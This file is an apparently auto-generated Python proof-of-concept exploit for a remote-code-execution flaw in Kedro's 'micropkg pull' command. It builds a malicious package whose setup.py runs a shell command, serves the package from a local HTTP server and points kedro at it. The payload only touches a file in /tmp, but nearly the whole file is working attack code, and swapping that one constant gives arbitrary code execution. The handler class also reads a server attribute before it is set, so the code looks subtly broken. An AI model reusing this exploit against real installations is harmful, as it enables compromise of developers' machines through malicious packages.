#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: rce-011
# Sink: call
# Auto-generated — run with: python3 rce_cli_pyproject_call.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull RCE via pip download.

Vulnerability: The `package_path` parameter (from CLI or pyproject.toml) is passed
directly to `pip download` without sanitization. While direct command injection is
prevented by using a list-based subprocess call, pip download can execute arbitrary
code via a malicious package's setup.py hooks during the download/build process.

This PoC creates a malicious Python package that executes a benign payload
(touch /tmp/poc_success.txt) when pip attempts to download it. It then starts a
simple HTTP server to serve the malicious package and triggers the vulnerable
Kedro command with a URL pointing to our server.

Usage:
    python3 kedro_rce_poc.py [--target-host HOST] [--target-port PORT]
    
    Default: serves on 0.0.0.0:9999, triggers Kedro with http://<ip>:9999/malicious-pkg
"""

import argparse
import http.server
import os
import shutil
import socketserver
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
from pathlib import Path

# Configuration
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 9999
PAYLOAD = "touch /tmp/poc_success.txt"  # Benign payload to prove RCE
PACKAGE_NAME = "malicious-pkg"
PACKAGE_VERSION = "1.0.0"


def create_malicious_package(output_dir: Path) -> Path:
    """
    Create a malicious Python source distribution (.tar.gz) that executes
    a payload during pip's download/build process via setup.py.
    
    The setup.py will execute the payload when pip runs it to determine
    package metadata (which happens during download with --no-binary :all:).
    """
    pkg_dir = output_dir / PACKAGE_NAME
    pkg_dir.mkdir(parents=True, exist_ok=True)
    
    # Create package directory structure
    src_dir = pkg_dir / PACKAGE_NAME.replace("-", "_")
    src_dir.mkdir(exist_ok=True)
    
    # Create __init__.py
    (src_dir / "__init__.py").write_text("# malicious package\n")
    
    # Create setup.py with payload execution
    setup_py = pkg_dir / "setup.py"
    setup_py.write_text(f'''#!/usr/bin/env python3
import os
import subprocess
import sys

# Execute payload during setup.py execution (runs during pip download)
subprocess.run("{PAYLOAD}", shell=True)

from setuptools import setup, find_packages

setup(
    name="{PACKAGE_NAME}",
    version="{PACKAGE_VERSION}",
    packages=find_packages(),
)
''')
    
    # Create setup.cfg (optional but good practice)
    (pkg_dir / "setup.cfg").write_text(f"""[metadata]
name = {PACKAGE_NAME}
version = {PACKAGE_VERSION}

[options]
packages = find:
""")
    
    # Create PKG-INFO (required for sdist)
    (pkg_dir / "PKG-INFO").write_text(f"""Metadata-Version: 2.1
Name: {PACKAGE_NAME}
Version: {PACKAGE_VERSION}
""")
    
    # Create the sdist (.tar.gz)
    sdist_path = output_dir / f"{PACKAGE_NAME}-{PACKAGE_VERSION}.tar.gz"
    with tarfile.open(sdist_path, "w:gz") as tar:
        tar.add(pkg_dir, arcname=f"{PACKAGE_NAME}-{PACKAGE_VERSION}")
    
    return sdist_path


class MaliciousPackageHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler that serves the malicious package directory."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(self.server.server_directory), **kwargs)
    
    def log_message(self, format, *args):
        """Suppress default logging, print custom message."""
        print(f"[HTTP] {self.client_address[0]} - {format % args}")


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """HTTP server that handles requests in separate threads."""
    allow_reuse_address = True
    server_directory = None  # Will be set before serving


def start_http_server(host: str, port: int, directory: Path) -> ThreadedHTTPServer:
    """Start a simple HTTP server to serve the malicious package."""
    server = ThreadedHTTPServer((host, port), MaliciousPackageHandler)
    server.server_directory = directory
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    print(f"[*] HTTP server started on {host}:{port}")
    print(f"[*] Serving malicious package from: {directory}")
    return server


def trigger_kedro_vulnerability(target_url: str):
    """
    Trigger the vulnerable Kedro command by calling:
        kedro micropkg pull --package-path <target_url>
    
    This will cause Kedro to call pip download with our malicious URL,
    which will execute the payload in setup.py.
    """
    print(f"[*] Triggering Kedro vulnerability with package path: {target_url}")
    print("[*] This will execute: kedro micropkg pull --package-path <url>")
    
    try:
        result = subprocess.run(
            [sys.executable, "-m", "kedro", "micropkg", "pull", "--package-path", target_url],
            capture_output=True,
            text=True,
            timeout=30,
        )
        print(f"[*] Kedro stdout: {result.stdout}")
        print(f"[*] Kedro stderr: {result.stderr}")
        print(f"[*] Kedro return code: {result.returncode}")
    except subprocess.TimeoutExpired:
        print("[!] Kedro command timed out (expected if pip hangs)")
    except FileNotFoundError:
        print("[!] Kedro not found. Make sure it's installed: pip install kedro")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error running Kedro: {e}")


def check_payload_execution():
    """Check if the payload was executed (touch /tmp/poc_success.txt)."""
    payload_file = Path("/tmp/poc_success.txt")
    if payload_file.exists():
        print("[+] SUCCESS: Payload executed! File /tmp/poc_success.txt was created.")
        print("[+] RCE confirmed via malicious pip package download.")
        # Clean up
        payload_file.unlink()
        return True
    else:
        print("[-] Payload file not found. Exploit may have failed.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Kedro micropkg pull RCE Proof-of-Concept",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
    python3 kedro_rce_poc.py --target-host 0.0.0.0 --target-port 9999
        """,
    )
    parser.add_argument(
        "--target-host",
        default=DEFAULT_HOST,
        help=f"Host to bind HTTP server (default: {DEFAULT_HOST})",
    )
    parser.add_argument(
        "--target-port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Port to bind HTTP server (default: {DEFAULT_PORT})",
    )
    args = parser.parse_args()
    
    print("[*] Kedro micropkg pull RCE Proof-of-Concept")
    print("[*] =========================================")
    
    # Create temporary directory for malicious package
    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        
        # Step 1: Create malicious package
        print("[*] Step 1: Creating malicious Python package...")
        sdist_path = create_malicious_package(tmp_path)
        print(f"[*] Malicious sdist created at: {sdist_path}")
        
        # Step 2: Start HTTP server
        print("[*] Step 2: Starting HTTP server to serve malicious package...")
        server = start_http_server(args.target_host, args.target_port, tmp_path)
        
        # Get our IP address for the URL
        import socket
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Construct the URL that pip will try to download
        # pip download can accept URLs directly
        package_url = f"http://{local_ip}:{args.target_port}/{sdist_path.name}"
        
        # Step 3: Trigger the vulnerability
        print("[*] Step 3: Triggering Kedro vulnerability...")
        print(f"[*] Package URL: {package_url}")
        trigger_kedro_vulnerability(package_url)
        
        # Give the server a moment to handle any pending requests
        time.sleep(1)
        
        # Step 4: Check if payload executed
        print("[*] Step 4: Checking for payload execution...")
        check_payload_execution()
        
        # Cleanup
        server.shutdown()
        print("[*] HTTP server stopped.")
    
    print("[*] Proof-of-Concept complete.")


if __name__ == "__main__":
    main()
